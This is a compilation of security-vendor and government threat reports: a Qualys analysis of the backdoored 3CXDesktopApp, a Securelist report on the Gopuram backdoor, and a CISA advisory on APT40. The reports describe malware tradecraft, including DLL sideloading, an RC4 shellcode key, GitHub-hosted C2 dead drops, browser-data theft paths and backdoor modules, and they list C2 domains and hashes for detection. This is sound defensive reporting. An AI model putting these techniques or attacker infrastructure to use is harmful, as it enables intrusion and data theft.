Active Scanning: Scanning IP Blocks The threat actor probed external services in an attempt to regain access to the environment Indicators of Compromise (IOCs) Indicator Details http://satkas.waw[.]pl/rainloop/forecast TrailBlazer C2 1326932d63485e299ba8e03bfcd23057f7897c3ae0d26ed1235c4fb108adb105 TrailBlazer SHA256 vm-srv-1.gel.ulaval.ca GoldMax C2 2a3b660e19b56dad92ba45dd164d300e9bd9c3b17736004878f45ee23a0177ac GoldMax SHA256 156.96.46.116 TA Infrastructure 188.34.185.85 TA Infrastructure 212.103.61.74 TA Infrastructure 192.154.224.126 TA Infrastructure 23.29.115.180 TA Infrastructure 104.237.218.74 TA Infrastructure 23.82.128.144 TA Infrastructure Additional Resources Read about the latest trends in threat hunting and more in the 2021 Threat Hunting Report or simply download the report now. Learn more about Falcon OverWatch proactive managed threat hunting. 
Watch this video to see how Falcon OverWatch proactively hunts for threats in your environment. 
Learn more about the CrowdStrike Falcon:registered: platform by visiting the product webpage. 
Test CrowdStrike next-gen AV for yourself.
Start your free trial of Falcon Prevent today. 
title: 3CXDesktopApp Backdoored in a Suspected Lazarus Campaign url: https://blog.qualys.com/vulnerabilities-threat-research/2023/04/03/3cxdesktopapp-backdoored-in-a-suspected-lazarus-campaign Introduction The attack involved a compromised version of the 3CX VoIP desktop client, which was used to target 3CX’s customers.
The compromised 3CX application is a private automatic branch exchange (PABX) software and is available for Windows, macOS, Linux, Android, IOS and Chrome.
Currently, there are reports of attacks for both Windows and macOS. 
The Qualys Threat Research Unit (TRU) is tracking a supply chain compromise in a popular VOIP desktop client by 3CX that is attributed to DPRK nation-state adversaries.
The attack was reported in late March 2023 and is an ongoing investigation. 
Executive Summary The North Korean state-sponsored group Labyrinth Chollima have been identified as the perpetrators behind the supply chain compromise of 3CXDesktopApp beta 18.12.407 and final 18.12.416 applications.
The affected applications are signed and have valid signatures. 
The adversary infrastructure on GitHub used for staging the attack has now been taken down.
This means that newer infections will not occur.
However, the attack’s potential impact was significant, as the software is widely used by businesses around the world. 
To mitigate the risk, affected users are recommended to immediately uninstall the application and perform a full system scan to detect and remove any associated malware. 
This threat is being tracked as by MITRE as CVE-2023-29059 Fig.1 Campaign flow Technical Summary Once the affected version of 3CX is installed or updated, it drops a compromised ffmpeg.dll as well as d3dcompiler_47.dll, which contains embedded shellcode.
When 3CXDesktopApp starts, it sideloads the compromised ffmpeg.dll, which in turn decodes the embedded shellcode from d3dcompiler_47.dll and loads it.
The shellcode accesses a GitHub repository and brings down icon files which contain encrypted C2 strings that the shellcode then decrypts and communicates to.
The adversary has also deployed a previously unseen info stealer in the later stages of the attack and we have provided an analysis for it in later sections.
This info stealer gathers system information and browser data from Chrome, Edge, Brave, and Firefox.
This info stealer was likely meant to identify interesting targets for the operators. 
Existing customers of Qualys can follow the steps in the Detection and Protection sections to identify potential impacts.
We also recommended that customers implement robust security measures, such as regular vulnerability assessments, patch management regular auditing of vendors. 
Overall, this supply chain attack highlights the importance of ensuring the security and integrity of the supply chain, as well as the need for businesses to remain vigilant and proactive in their security measures. 
Operating SystemHashFilename Windows aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868 3cxdesktopapp-18.12.407.msi Windows 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983 3cxdesktopapp-18.12.416.msi macOS 5407cda7d3a75e7b1e030b1f33337a56f293578ffa8b3ae19c671051ed314290 3CXDesktopApp-18.11.1213.dmg macOS e6bbc33815b9f20b0cf832d7401dd893fbc467c800728b5891336706da0dbcec 3cxdesktopapp-latest.dmg Table.1 Details of the affected Applications Technical Analysis of Infection Stages First Stage Analysis 
The original MSI file which initiated the infection drops three files “3CXDesktopApp.exe”, “ffmpeg.dll”, and “d3dcompiler_47.dll”.
3CXDesktopApp.exe is the legitimate VOIP desktop application and is abused for side loading “ffmpeg.dll”. 
File Type MD5 SHA256 DLL PE 64bits ffmpeg.dll 27B134AF30F4A86F177DB2F2555FE01D C485674EE63EC8D4E8FDE9800788175A8B02D3F9416D0E763360FFF7F8EB4E02 DLL PE 64bits D3dcompiler_47.dll 82187AD3F0C6C225E2FBA0C867280CC9 11BE1803E2E307B647A8A7E02D128335C448FF741BF06BF52B332E0BBF423B03 Table.2 Initial dropped samples Once “ffmpeg.dll” is loaded, it tries to enumerate the current directory for the second DLL “d3dcompiler_47.dll”.
Once found, the “ffmpeg.dll” loads the second DLL into memory. 
Fig.2 ffmpeg enumerating current directory 
The “d3dcompiler_47.dll” DLL has an encrypted payload embedded in it.
ffmpeg.dll tries to identify this payload using the signature “0xCEFAEDFE”. 
Fig.3 Embedded encrypted payload 
After the identification of the encrypted payload.
“ffmpeg.dll” will try to decrypt it using the RC4 encryption scheme with the key “3jB(2bsG#@c7”. 
Fig.4 RC4 decryption The decrypted payload is shown below.
Also, a call to VirtualProtect() is made to give the PAGE_EXECUTE_READWRITE permissions for the payload to be executed. 
Fig.5 Decrypted payload The decrypted payload that is going to be executed contains another embedded DLL as shown below.
The DLL is dumped from memory to perform more investigations on it. 
Fig.6 Dll loading by encrypted payload Second Stage Analysis The embedded DLL will mainly try to fetch malicious “ico” files from the GitHub Repository “https://raw[.]githubusercontent[.]com/IconStorages/images/main/icon%d[.]ico”.
The repository contains multiple icon files that have Base64 and AES encrypted C2’s appended to them.
The full list of decoded C2’s is listed in the IOC section.
This repository has already been taken down. 
Qualys TRU detected an info stealer involved in the infection chain and considers it as a later-stage payload. 
Fig.
7 GitHub repository Info Stealer Analysis File Type MD5 SHA256 SignatureCompilation TimeDLL PE 64bits 7FAEA2B01796B80D180399040BB69835 8AB3A5EAAF8C296080FADF56B265194681D7DA5DA7C02562953A4CB60E147423 N/A Fri Mar 17 00:32:58 2023 Table.4 Info stealer details The info stealer was deployed in the later stages of the infection chain and is a previously unseen sample.
Its capabilities are mainly gathering system and browser information, including Chrome, Edge, Firefox, and Brave Browsers. 
Fig.8 Browser DB location The info stealer uses queries to fetch browsers history and data for Edge, SQLite database history for chrome and “Places” Table for Firefox. 
Fig.9 SQL queries for collection The info stealer also collects information on infected hosts, such as domain name, Hostname and OS Version, using NetWkstaGetInfo() API.
Following locations are accessed by the information stealer: Google Chrome – AppData\Local\Google\Chrome\User Data Microsoft Edge – AppData\Local\Microsoft\Edge\User Data Brave Browser – AppData\Local\BraveSoftware\Brave-Browser\User Data Mozilla Firefox – AppData\Roaming\Mozilla\Firefox\Profiles Fig.10 System data collection -1 Fig.10 System data collection -2 Qualys Detection & Protection 
The first step in assessing the risk of this attack to an organization is understanding if this software is in use.
Users of the Qualys Cyber Security Asset Management can quickly identify all installed software across their organization.
For example, within seconds, you can use the below query to identify assets with instances of the 3CX Desktop Application. software:(name:”3CX Desktop App 18.12″) 
Fig.12 CSAM Software Search Qualys VMDR also has QID 378327 ready to detect assets which have the vulnerable version of the 3CXDesktopApp.exe file present on their machines.
Qualys Vulnerability Management Detection and Response (VMDR) users can scan their environment with this QID to quickly detect impacted systems.
Example output: Fig.13
VMDR QID 378327 details Alternatively, another option is to gather data from endpoints to hunt for the existence of the impacted software.
Two such open-source scripts are available on GitHub.
The 3cxIngectionHunter script will simply crawl the filesystem looking for instances of the infected ffmpeg.dll file and report back if there is a match to the malicious hash.
The 3CXLocalDNSCacheHunter script will collect the local DNS cache and look for a match against some of the known URLs associated with this campaign.
Using Qualys Custom Asset and Remediation, you can utilize the following PowerShell community scripts to identify potential infected assets by either copying the contents of the script manually or pointing the tool to the GitHub script directly to download. 
Fig.14 CAR Scripts Users of Custom Assessment and Remediation and Qualys Patch Management can also push scripts to uninstall the impacted software automatically.
These scripts will be published to GitHub in the coming days. 
An example output from a system that does not have a vulnerable version of ffmpeg.dll installed: Fig.15 CAR script output CAR can also be leveraged to remediate this vulnerability.
You need to execute this uninstallation script provided by Qualys.
This script checks for 3CX Desktop App’s vulnerable version 18.12.407.0 & 18.12.416.0 for Windows.
If any of these versions are installed on the system, the script will attempt to uninstall the vulnerable application. 
Fig.16 CAR script for remediation You can also create dashboards for better visualization. 
Fig.17 CAR dashboard for 3CX Qualys Multi-Vector EDR customers are protected against this threat as both the installer and the beacon are detected and will be remediated.
(Note: our instance was set to audit-only mode for analysis.) 
Fig.18 EPP Scan Results Fig.19 Epp Detection for shellcode loader Multi-Vector EDR customers can also hunt through telemetry, looking for behavior indicators to identify this threat activity.
A first step would look for instances where the 3cxdesktopapp.exe process executed in the environment using a QQL Query of process.name:”3xcdesktopapp.exe”.
Here you would want to look for evidence of the ffmpeg.dll file being loaded, which would be indicative that this machine may be impacted by this campaign. 
Fig.20 EDR Behavioral Detection Telemetry Fig.21 EDR Shellcode Loader Detection Fig.22 Loaded malicious ffmpeg.dll telemetry While Qualys Endpoint Protection (EPP) users will be automatically protected by default, Qualys EDR-only customers can use the recently released auto-remediation feature to automatically take action. 
Conclusion Supply chain compromises are a growing concern for businesses, as they can lead to serious security breaches and financial losses.
The attack was a multi-stage chain where attackers compromised a version of the 3CX VoIP desktop client, which was then used to target the company’s customers.
This is reminiscent of the SolarWinds campaign that we examined back in December 2022. 
Organizations should take immediate steps to stop using the vulnerable version of the software, apply patches and monitor for anomalous behavior in 3CX processes.
It is also essential to enable behavioral monitoring to detect the presence of such attacks within the system. 
MITRE TID Mapping TacticTechnique IDTechnique Name Resource Development T1608.001 Stage Capabilities: Upload Malware Resource Development T1587.003 Develop Capabilities: Digital Certificates Initial Access T1195.002 Supply Chain Compromise: Compromise Software Supply Chain Execution T1106 Native API Execution T1204.002 
User Execution: Malicious File Defense Evasion T1140 Deobfuscate/Decode Files or Information Defense Evasion T1027 Obfuscated Files or Information Defense Evasion T1574.002 Hijack Execution Flow: DLL Side-Loading Defense Evasion T1553.002 Subvert Trust Controls: Code Signing Defense Evasion T1497.003 Virtualization/Sandbox Evasion: Time-Based Evasion Credential Access T1555 Credentials from Password Stores Credential Access T1539 Steal Web Session Cookie Command and Control T1132.001 Data Encoding: Standard Encoding Command and Control T1102.001 Web Service:
Dead Drop Resolver Command and Control T1071 Application Layer Protocol Collection T1005 Data from Local System Table.5 MITRE mapping IOCS ffmpeg.dll C485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896 c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02 d3dcompiler.dll 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03 Embedded dll F86A81B89C5FD4C98BC8616440FF0382505EC7942DA6D4F19EEE011E956434A8 Trojanized 3cxDesktopApp Dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc Fad482ded2e25ce9e1dd3d3ecc3227af714bdfbbde04347dbc1b21d6a3670405 92005051ae314d61074ed94a52e76b1c3e21e7f0e8c1d1fdd497a006ce45fa61 
B86c695822013483fa4e2dfdf712c5ee777d7b99cbad8c2fa2274b133481eadb 
Infostealer dll Cad1120d91b812acafef7175f949dd1b09c6c21a 7faea2b01796b80d180399040bb69835 GitHub Repository raw[.]githubusercontent[.]com/IconStorages/images/main/ C2s akamaicontainer[.]com akamaitechcloudservices[.]com azuredeploystore[.]com azureonlinecloud[.]com azureonlinestorage[.]com dunamistrd[.]com glcloudservice[.]com journalide[.]org msedgepackageinfo[.]com msstorageazure[.]com msstorageboxes[.]com officeaddons[.]com officestoragebox[.]com pbxcloudeservices[.]com pbxphonenetwork[.]com pbxsources[.]com qwepoi123098[.]com sbmsa[.]wiki sourceslabs[.]com visualstudiofactory[.]com zacharryblogs[.]com Icon File Hashes a541e5fc421c358e0a2b07bf4771e897fb5a617998aa4876e0e1baa5fbb8e25c d459aa0a63140ccc647e9026bfd1fccd4c310c262a88896c57bbe3b6456bd090 d51a790d187439ce030cf763237e992e9196e9aa41797a94956681b6279d1b9a 4e08e4ffc699e0a1de4a5225a0b4920933fbb9cf123cde33e1674fde6d61444f 8c0b7d90f14c55d4f1d0f17e0242efd78fd4ed0c344ac6469611ec72defa6b2d f47c883f59a4802514c57680de3f41f690871e26f250c6e890651ba71027e4d3 2c9957ea04d033d68b769f333a48e228c32bcf26bd98e51310efd48e80c1789f 268d4e399dbbb42ee1cd64d0da72c57214ac987efbb509c46cc57ea6b214beca c62dce8a77d777774e059cf1720d77c47b97d97c3b0cf43ade5d96bf724639bd c13d49ed325dec9551906bafb6de9ec947e5ff936e7e40877feb2ba4bb176396 f1bf4078141d7ccb4f82e3f4f1c3571ee6dd79b5335eb0e0464f877e6e6e3182 2487b4e3c950d56fb15316245b3c51fbd70717838f6f82f32db2efcc4d9da6de e059c8c8b01d6f3af32257fc2b6fe188d5f4359c308b3684b1e0db2071c3425c d0f1984b4fe896d0024533510ce22d71e05b20bad74d53fae158dc752a65782e Contributors Travis Smith, Vice President, Threat Research Unit, Qualys Irfan Asrar, Director, Malware and Threat Research, Qualys Mayuresh Dani, Manager, Threat Research.
Qualys Sabri Naoufal, Senior Malware Analyst, Qualys Mohammad Shabbir, Malware Analyst, Qualys Akshat Pradhan, Senior Engineer, Threat Research, Qualys 
title: Not just an infostealer: Gopuram backdoor deployed through 3CX supply chain attack url: https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/ On March 29, Crowdstrike published a report about a supply chain attack conducted via 3CXDesktopApp, a popular VoIP program.
Since then, the security community has started analyzing the attack and sharing their findings.
The following has been discovered so far: 
The infection is spread via 3CXDesktopApp MSI installers.
An installer for macOS has also been trojanized. 
The malicious installation package contains an infected dll library that decrypts a shellcode from the d3dcompiler_47.dll library’s overlay and executes it. 
The decrypted payload extracts C2 server URLs from icons stored in a GitHub repository (the repository is removed). 
The payload connects to one of the C2 servers, downloads an infostealer and starts it. 
The infostealer collects system information and browser history, then sends it to the C2 server. 
As we reviewed available reports on the 3CX attack, we began wondering if the compromise concluded with the infostealer or further implants followed.
To answer that question, we decided to review the telemetry we had on the campaign.
On one of the machines, we observed a DLL named guard64.dll, which was loaded into the infected 3CXDesktopApp.exe process.
Interestingly enough, we opened an investigation into a case linked to that DLL on March 21, about a week before the supply chain attack was discovered.
A DLL with that name was used in recent deployments of a backdoor that we dubbed “Gopuram” and had been tracking internally since 2020.
Three years ago, we were investigating an infection of a cryptocurrency company located in Southeast Asia.
During the investigation, we found that Gopuram coexisted on victim machines with AppleJeus, a backdoor attributed to the Korean-speaking threat actor Lazarus. 
Over the years, we observed few victims compromised with Gopuram, but the number of infections began to increase in March 2023.
As it turned out, the increase was directly related to the 3CX supply chain attack.
We found out that the threat actor specifically targeted cryptocurrency companies, dropping the following files on infected machines: C:\Windows\system32\wlbsctrl.dll, a malicious library (MD5: 9f85a07d4b4abff82ca18d990f062a84); C:\Windows\System32\config\TxR\<machine hardware profile GUID>.TxR.0.regtrans-ms, an encrypted shellcode payload. 
Once dropped, wlbsctrl.dll becomes loaded on every startup by the IKEEXT service via DLL hijacking.
We further saw DLLs with the names ualapi.dll and ncobjapi.dll being sideloaded into spoolsv.exe and svchost.exe, respectively. 
The wlbsctrl.dll library is responsible for decrypting and executing the shellcode stored in the C:\Windows\System32\config\TxR directory.
The decryption is notably performed through the CryptUnprotectData API function that uses a different encryption key internally on every machine.
This makes it difficult for researchers to decrypt the payload from the file without physical access to the victim machines. 
Snippet of the loading function using CryptUnprotectData The component loaded by the library is Gopuram’s main module.
As mentioned above, its name in the export directory is guard64.dll.
The job of the main module is to connect to a C2 server and request commands.
The backdoor implements commands that allow the attackers to interact with the victim’s file system and create processes on the infected machine.
Gopuram was additionally observed to launch in-memory modules.
Just like the implants used in the 3CX campaign, Gopuram’s modules are DLL files that include an export function named DllGetClassObject.
We have observed eight modules so far: Module name Description Ping Pings a host specified in the argument. 
Connect Connects to a given host via a socket and waits for the server to send data. 
Registry Manipulates registry (lists, adds, deletes and exports keys). 
Service Manipulates (creates, lists, starts, stops and deletes) services. 
Timestomp Performs timestomping on files. 
Inject Performs payload injections through syscalls via mapping a shellcode to a remote process and creating a remote thread. 
KDU Kernel Driver Utility that allows an attacker to bypass driver signature enforcement.
The utility is used to load an unsigned driver (MD5: F684E10FF1FFCDD32C62E73A11382896).
The driver collects information about installed AV filters and writes it to the C:\Windows\System32\catroot2\edb.chk.log file. 
Update Encrypts a provided payload
and writes it to the C:\Windows\System32\config\TxR\<machine hardware profile GUID>.TxR.0.regtrans-ms file. 
Net Partially implements features of the net command: management of users, groups, sessions and network shares. 
The discovery of the new Gopuram infections allowed us to attribute the 3CX campaign to the Lazarus threat actor with medium to high confidence.
Our attribution is based on the following facts: While investigating an attack on a Southeast Asian cryptocurrency company in 2020, we found Gopuram coexisting on the same machine with the AppleJeus backdoor, which is attributed to Lazarus. 
The Gopuram backdoor has been observed in attacks on cryptocurrency companies, which is aligned with the interests of the Lazarus threat actor. 
While looking for additional implants that used the same loader shellcode as the 3CX implants, we discovered a sample on a multiscanner service (MD5: 933508a9832da1150fcfdbc1ca9bc84c) loading a payload that uses the wirexpro[.]com C2 server.
The same server is listed as an IoC for an AppleJeus campaign by Malwarebytes. 
First bytes of the loader shellcode used in 3CX and AppleJeus Note, though, that the shellcode is based on open-source code that has been used by other threat actors, for example, SilentBreak.
Still, the use of that shellcode along with the 0xF558F4DA constant (which is the ROR13 hash for the string DllGetClassObject) is a more unique pattern. 
While investigating a malicious MSI file (MD5: ec3f99dd7d9dbce8d704d407b086e84f) that has been uploaded to a multiscanner service, we observed the following two events: The dll library dropped from the MSI was observed to launch an in-memory payload that contacts the oilycargo[.]com domain.
This domain name has previously been attributed to Lazarus by multiple researchers. 
In our telemetry, we observed AvBugReport.exe, the executable hosting dll, to contain Gopuram’s main module payload, guard64.dll. 
These four facts allow us to conclude that Lazarus is likely the threat actor deploying the Gopuram backdoor. 
As for the victims in our telemetry, installations of the infected 3CX software are located all over the world, with the highest infection figures observed in Brazil, Germany, Italy and France. 
As the Gopuram backdoor has been deployed to less than ten infected machines, it indicates that attackers used Gopuram with surgical precision.
We additionally observed that the attackers have a specific interest in cryptocurrency companies. 
As it turns out, the infostealer is not the only malicious payload deployed during the 3CX supply chain attack.
The threat actor behind Gopuram additionally infects target machines with the full-fledged modular Gopuram backdoor.
We believe that Gopuram is the main implant and the final payload in the attack chain.
Our investigation of the 3CX campaign is still far from complete.
We will continue analyzing the deployed implants to find out more details about the toolset used in the supply chain attack. 
Gopuram indicators of compromise MD5 hashes 9f85a07d4b4abff82ca18d990f062a84 96d3bbf4d2cf6bc452b53c67b3f2516a File paths C:\Windows\System32\config\TxR\<machine hardware profile GUID>.TxR.0.regtrans-ms C:\Windows\system32\catroot2\edb.chk.log More indicators of compromise and YARA rules for detecting Gopuram components are available for TIP subscribers.
Contact intelreports@kaspersky.com for more details. 
title: AA21-200A: Tactics, Techniques, and Procedures of Indicted APT40 Actors Associated with China’s MSS Hainan State Security Department url: https://us-cert.cisa.gov/ncas/alerts/aa21-200a Original release date: July 19, 2021SummaryThis Joint Cybersecurity Advisory was written by the Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) to provide information on a Chinese Advanced Persistent Threat (APT) group known in open-source reporting as APT40.
This advisory provides APT40’s tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help cybersecurity practitioners identify and remediate APT40 intrusions and established footholds. 
APT40—aka BRONZE MOHAWK, FEVERDREAM, G0065, Gadolinium, GreenCrash, Hellsing, Kryptonite Panda, Leviathan, MUDCARP, Periscope, Temp.
Periscope, and Temp.
Jumper—is located in Haikou, Hainan Province, People’s Republic of China (PRC), and has been active since at least 2009.
APT40 has targeted governmental organizations, companies, and universities in a wide range of industries—including biomedical, robotics, and maritime research—across the United States, Canada, Europe, the Middle East, and the South China Sea area, as well as industries included in China’s Belt and Road Initiative. 
On July 19, 2021, the U.S. Department of Justice (DOJ) unsealed an indictment against four APT40 cyber actors for their illicit computer network exploitation (CNE) activities via front company Hainan Xiandun Technology Development Company (Hainan Xiandun).
Hainan Xiandun employee Wu Shurong cooperated with and carried out orders from PRC Ministry of State Security (MSS) Hainan State Security Department (HSSD) intelligence officers Ding Xiaoyang, Zhu Yunmin, and Cheng Qingmin to conduct CNE.
Wu’s CNE activities resulted in the theft of trade secrets, intellectual property, and other high-value information from companies and organizations in the United States and abroad, as well as from multiple foreign governments.
These MSS-affiliated actors targeted victims in the following industries: academia, aerospace/aviation, biomedical, defense industrial base, education, government, healthcare, manufacturing, maritime, research institutes, and transportation (rail and shipping). 
Click here for a PDF version of this report. 
(Updated July 19, 2021) Click here for indicators of compromise (IOCs) in STIX format. 
Note: to uncover malicious activity, incident responders search for IOCs in network- and host-based artifacts and assess the results—eliminating false positives during the assessment.
For example, some MD5 IOCs in the STIX file identify legitimate tools—such as Putty, cmd.exe, svchost.exe, etc.—as indicators of compromise.
Although the tools themselves are not malicious, APT 40 attackers placed and used them from non-standard folders on victim systems during computer intrusion activity.
If a legitimate tool is identified by an incident responder, then the location of the tool should be assessed to eliminate false positives or uncover malicious activity.
See Technical Approaches to Uncovering and Remediating Malicious Activity for more incident handling guidance. 
Technical DetailsThis Joint Cybersecurity Advisory uses the MITRE ATT&CK:registered: framework, version 9.
See the ATT&CK for Enterprise framework for all referenced threat actor tactics and techniques. 
APT40
[G0065] has used a variety of tactics and techniques and a large library of custom and open-source malware—much of which is shared with multiple other suspected Chinese groups—to establish initial access via user and administrator credentials, enable lateral movement once inside the network, and locate high value assets in order to exfiltrate data.
Table 1 provides details on these tactics and techniques.
Note: see the appendix for a list of the domains, file names, and malware MD5 hash values used to facilitate this activity. 
Table 1: APT40
ATT&CK Tactics and Techniques Tactics Activities and Techniques Reconnaissance [TA0043] and Resource Development [TA0042] Gathered victim identity information [T1589] by collecting compromised credentials [T1589.001] Acquire infrastructure
[T1583] to establish domains that impersonate legitimate entities [T1583.001], aka ‘typosquatting’, to use in watering hole attacks and as command and control (C2)
[TA0011] infrastructure Establish new [T1585.002] and compromise existing [T1586.002] email and social media accounts
[1585.001] to conduct social engineering attacks Initial Access
[TA0001] External remote services (e.g., virtual private network
[VPN] services)
[T1133] Spearphishing emails with malicious attachments [T1566.001] and links [T1566.002] Drive-by compromises
[T1189] and exploitation of public-facing applications [T1190] Access to valid
[T1078], compromised administrative [T1078.001] accounts Execution
[TA0002] Command and scripting interpreters
[T1059] such as PowerShell [T1059.001] Exploitation of software vulnerabilities in client applications to execute code
[T1203] using lure documents that dropped malware exploiting various Common Vulnerabilities and Exposures (CVEs) 
User execution
[T1204] of malicious files [T1204.002] and links
[T1566.002] attached to spearphishing emails [T1566.001] Persistence [TA0003], Privilege Escalation [TA0004], Credential Access
[TA0006], Discovery [TA0007], and Lateral Movement
[TA0008] APT40 has used a combination of tool frameworks and malware to establish persistence, escalate privileges, map, and move laterally on victim networks.
Additionally, APT40 conducted internal spearphishing attacks [T1534]. BADFLICK/Greencrash China Chopper [S0020] Cobalt Strike [S0154] Derusbi/PHOTO [S0021] Gh0stRAT
[S0032] GreenRAT jjdoor/Transporter jumpkick Murkytop (mt.exe)
[S0233] NanHaiShu [S0228] Orz/AirBreak [S0229] PowerShell Empire
[S0363] PowerSploit
[S0194] Server software component: Web Shell [TA1505.003] Defense Evasion
[TA0005], Command and Control
[TA0011], Collection [TA0009], and Exfiltration [TA0010] Use of steganography [T1027.003] to hide stolen data inside other files stored on GitHub Protocol impersonation
[T1001.003] by using Application Programming Interface (API) keys for Dropbox accounts in commands to upload stolen data to make it appear that the activity was a legitimate use of the Dropbox service Protocol tunneling [T1572] and multi-hop proxies
[T1090.003], including the use of Tor [S0183] Use of domain typosquatting for C2 infrastructure [T1583.001] Archive [T1560], encrypt [T1532], and stage collected data locally
[T1074.001] and remotely [T1074.002] for exfiltration Exfiltration over C2 channel [T1041] MitigationsNetwork Defense-in-Depth Proper network defense-in-depth and adherence to information security best practices can assist in mitigating the threat and reducing the risk.
The following guidance may assist organizations in developing network defense procedures. 
Patch and Vulnerability Management Install vendor-provided and verified patches on all systems for critical vulnerabilities, prioritizing timely patching of internet-connected servers and software processing internet data—such as web browsers, browser plugins, and document readers. 
Ensure proper migrating steps or compensating controls are implemented for vulnerabilities that cannot be patched in a timely manner. 
Maintain up-to-date antivirus signatures and engines. 
Routinely audit configuration and patch management programs to ensure the ability to track and mitigate emerging threats.
Implementing a rigorous configuration and patch management program will hamper sophisticated cyber threat actors’ operations and protect resources and information systems. 
Review the articles in the References section for more information on Chinese APT exploitation of common vulnerabilities. 
Protect Credentials Strengthen credential requirements, regularly change passwords, and implement multi-factor authentication to protect individual accounts, particularly for webmail and VPN access and for accounts that access critical systems.
Do not reuse passwords for multiple accounts. 
Audit all remote authentications from trusted networks or service providers. 
Detect mismatches by correlating credentials used within internal networks with those employed on external-facing systems. 
Log use of system administrator commands such as net, ipconfig, and ping. 
Enforce principle of least privilege. 
Network Hygiene and Monitoring Actively scan and monitor internet-accessible applications for unauthorized access, modification, and anomalous activities. 
Actively monitor server disk use and audit for significant changes. 
Log Domain Name Service (DNS) queries and consider blocking all outbound DNS requests that do not originate from approved DNS servers.
Monitor DNS queries for C2 over DNS. 
Develop and monitor the network and system baselines to allow for the identification of anomalous activity.
Audit logs for suspicious behavior. 
Identify and suspend access of users exhibiting unusual activity. 
Use allowlist or baseline comparison to monitor Windows event logs and network traffic to detect when a user maps a privileged administrative share on a Windows system. 
Leverage multi-sourced threat-reputation services for files, DNS, URLs, IP addresses, and email addresses. 
Network device management interfaces—such as Telnet, Secure Shell (SSH), Winbox, and HTTP—should be turned off for wide area network (WAN) interfaces and secured with strong passwords and encryption when enabled. 
When possible, segment critical information on air-gapped systems.
Use strict access control measures for critical data. 
APPENDIX:
APT40 Indicators of Compromise APT40 used the following domains, file names, and malware MD5 hash values to facilitate the CNE activity outlined in this CSA between 2009 through 2018. 
Domains airbusocean[.]com https://pastebin[.]com/vfb5mbbu pacifichydrologic[.]org cargillnotice[.]com huntingtomingalls[.]com philippinenewss[.]com ccidmeekparry[.]info indiadigest[.]in philstarnotice[.]com ccvzvhjhdf[.]website jack-newnb[.]com porndec143.chickenkiller[.]com cdigroups[.]com kAty197.chickenkiller[.]com santaclarasystem[.]us checkecc[.]com louisdreyfu[.]com scsnewstoday[.]com chemscalere[.]com mail2.ignorelist[.]com secbkav[.]com cnnzapmeta[.]com masterroot[.]pw Soure7788.chickenkiller[.]com corycs[.]com microsql-update[.]info tccoll[.]com deltektimes[.]com mihybb[.]com teledynegroup[.]com Engaction[.]com mlcdailynews[.]com teledyneinstrument[.]com ens-smithjonathan.rhcloud[.]com movyaction[.]net testdomain2019.chickenkiller[.]com fishgatesite.wordpress[.]com msusanode[.]com thestar[.]live goo2k88yyh2.chickenkiller[.]com newbb-news[.]com thrivedataview[.]com gttdoskip[.]com nfmybb[.]com thyssemkrupp[.]com http://gkimertds.wordpress[.]com/feed/ nmw4xhipveaca7hm[.]onion.link/en_US/all.js thyssenkrupp-marinesystems[.]org http://stackoverflow[.]com/users/3627469/angle-swift nobug[.]uk.to togetno992.mooo[.]com http://stackoverflow[.]com/users/3804206/swiftr-angle notesof992.wordpress[.]com tojenner97.chickenkiller[.]com http://stackoverflow[.]com/users/3863346/gkimertdssdads onlinenewspapers[.]club trafficeco[.]com vser.mooo[.]com onlineobl[.]com transupdate[.]com https://pastebin[.]com/p1mktQpD oyukg43t[.]website troubledate[.]com ultrasocial[.]info wsmcoff[.]com xbug.uk[.]to usdagroup[.]com www.yorkshire-espana-sa[.]com/english/servicios/ yootypes[.]com https://github[.]com/slotz/sharp-loader/commit/f9de338fb474fd970a7375030642d04179b9245d MD5 Malware Hashes (Updated July 19, 2021) Note: to uncover malicious activity, incident responders search for indicators of compromise (IOCs) in network- and host-based artifacts and assess the results—eliminating false positives during the assessment.
For example, some MD5 IOCs in the table below identify legitimate tools—such as PuTTY, cmd.exe, svchost.exe, etc.—as indicators of compromise.
See Technical Approaches to Uncovering and Remediating Malicious Activity for more incident handling guidance. 
01234c0e41fc23bb5e1946f69e6c6221 018d3c34a296edd32e1b39b7276dcf7f 019b68e26df8750e2f9f580b150b7293 01fa52a4f9268948b6c508fef0377299 022bd2040ec0476d8eb80d1d9dc5cc92 039d9ca446e79f2f4310dc7dcc60ec55 043f6cdca33ce68b1ebe0fd79e4685af 04918772a2a6ccd049e42be16bcbee39 04dc4ca70f788b10f496a404c4903ac6 060067666435370e0289d4add7a07c3b 062c759d04106e46e027bbe3b93f33ef 07083008885d2d0b31b137e896c7266c 079068181a728d0d603fe72ebfc7e910 0803f8c5ee4a152f2108e64c1e7f0233 09143a14272a29c56ff32df160dfdb30 0985f757b1b51533b6c5cf9b1467f388 09aab083fb399527f8ff3065f7796443 0b7bb3e23a1be2f26b9adf7004fc6b52 0b9a614a2bbc64c1f32b95988e5a3359 0bbe092a2120b1be699387be16b5f8fb 0bbe769505ca3db6016da400539f77aa 0c3c00c01f4c4bad92b5ba56bd5a9598 0c4fa4dfbe0b07d3425fea3efe60be1c 0ca936a564508a1f9c91cb7943e07c30 0d69eefede612493afd16a7541415b95 0da08b4bfe84eacc9a1d9642046c3b3c 0dd7f10fdf60fc36d81558e0c4930984 0e01ec14c25f9732cc47cf6344107672 10191b6ce29b4e2bddb9e57d99e6c471 105757d1499f3790e69fb1a41e372fd9 207e3c538231eb0fd805c1fc137a7b46 20e52d2d1742f3a3caafbac07a8aa99a 226042db47bdd3677bd16609d18930bd 22823fed979903f8dfe3b5d28537eb47 2366918da9a484735ec3a9808296aab8 239a22c0431620dc937bc36476e5e245 2499390148fc99a0f38148655d8059e7 24dbcd8e8e478a35943a05c7adfc87cc 25a06ab7675e8f9e231368d328d95344 25b79ba11f4a22c962fea4a13856da7f 